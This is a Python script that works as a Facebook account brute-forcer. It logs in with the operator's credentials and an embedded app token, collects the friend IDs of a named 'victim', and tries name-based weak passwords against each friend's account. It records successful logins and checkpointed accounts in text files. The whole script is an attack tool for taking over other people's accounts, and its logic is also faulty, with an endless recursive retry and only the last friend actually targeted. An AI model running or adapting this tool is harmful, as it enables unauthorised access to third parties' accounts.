import requests
import sys
import json
scrapped_accounts = []
print("\n"+"\n")
username = input("[ x ] Enter Username : ")
password = input("[ x ] Enter Password : ")
login = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+str(username)+"&locale=en_US&password="+str(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
login_data = json.loads(login.text)
if 'access_token' in login_data:
  print("\n\n[ x ] Username and Password Correct [ x ]")
  open_session = open("Session.txt","w")
  open_session.write(login_data['access_token'])
  open_session.close()
  victim_account = input("[ x ] Enter Victim ID : ")
elif 'www.facebook.com' in login_data['error_msg']:
  print("\n\n[ x ] Account In Checkpoint [ x ]")
  exit()
else:
  print("\n\n[ x ] Password Or Username Are Incorrect [ x ]")
  exit()
import os
if os.path.exists("Session.txt") != False:
  read_session = open("Session.txt").readlines()
  read_session = login_data['access_token']
else:
  print("[ x ] Session File Not Found [ x ]")
pub_id = requests.get("https://graph.facebook.com/"+str(victim_account)+"?access_token="+str(read_session))
id_info = json.loads(pub_id.text)
if "error" in id_info:
  print("[ x ] Facebook Blocked You For Some Reason Try with Other Account [ x ]")
elif 'name' in id_info:
  print("[ x ] Name : "+id_info['name']+" [ x ]")
  frnds = requests.get("https://graph.facebook.com/"+str(victim_account)+"/friends?access_token="+str(read_session))
  friend_by_frnds = json.loads(frnds.text)
  for ids in friend_by_frnds['data']:
    scrapped_accounts.append(ids['id'])
  print("[ x ] Total Friends : "+str(len(scrapped_accounts))+" [ x ]")
  print(45*"-")
else:
  print("[ x ] Some Error Founded [ x ]")
for id_code in scrapped_accounts:
  first_last_name = requests.get("https://graph.facebook.com/"+id_code+"/?access_token="+read_session)
  name = json.loads(first_last_name.text)
  names = name['first_name']
  last_name = name['last_name']
  def main(id_code,password):
    brute = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_code + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
    password_try = json.loads(brute.text)
    print("[ x ] Trying on "+name['name']+" [ x ]")
    if "access_token" in password_try:
      print("[ OK ] "+id_code+" | "+password+" [ OK ]")
      success_file = open("Successful.txt","a")
      success_file.write(id_code+" | "+password+"\n")
      success_file.close()
    elif "www.facebook.com" in password_try['error_msg']:
      print("[ CP ] "+id_code+" | "+password+" [ CP ]")
      cp_file = open("Checkpoint.txt","a")
      cp_file.write(id_code+" | "+password+"\n")
      cp_file.close()
    else:
      main(id_code,password)
password = ["786786",names+"123",names+"1234",names+"12345",last_name+"123",last_name+"1234",last_name+"1235"]
for passwd in password:
  if "__main__" == __name__:
    main(id_code,passwd)